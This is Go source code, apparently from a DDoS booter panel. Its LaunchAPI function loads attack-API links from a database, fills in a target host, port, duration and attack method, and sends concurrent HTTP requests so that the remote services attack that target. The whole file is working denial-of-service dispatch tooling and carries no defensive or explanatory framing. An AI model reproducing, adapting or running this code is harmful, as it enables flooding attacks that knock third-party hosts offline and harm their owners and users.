package attacks

import (
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"
	"webserver/src/database"
)

func LaunchAPI(host string, port string, time string, method string) error {
	apis, err := database.FetchAPIS()
	if err != nil {
		log.Printf("(attk/err) %s", err)
		return err
	}

	for _, api := range apis {
		replacer := strings.NewReplacer(
			"{HOST}", host,
			"{PORT}", port,
			"{TIME}", time,
			"{METHOD}", method,
			"[HOST]", host,
			"[PORT]", port,
			"[TIME]", time,
			"[METHOD]", method,
		)
		url := replacer.Replace(api.Link)
		fmt.Printf("(api) Sending Request To ID [%d]\r\n", api.Id)
		go ApiAttack(url)
	}
	return nil
}

func ApiAttack(link string) error {
	tr := &http.Transport{
		ResponseHeaderTimeout: 5 * time.Second,
		DisableCompression:    true,
	}
	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
	resp, err := client.Get(link)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
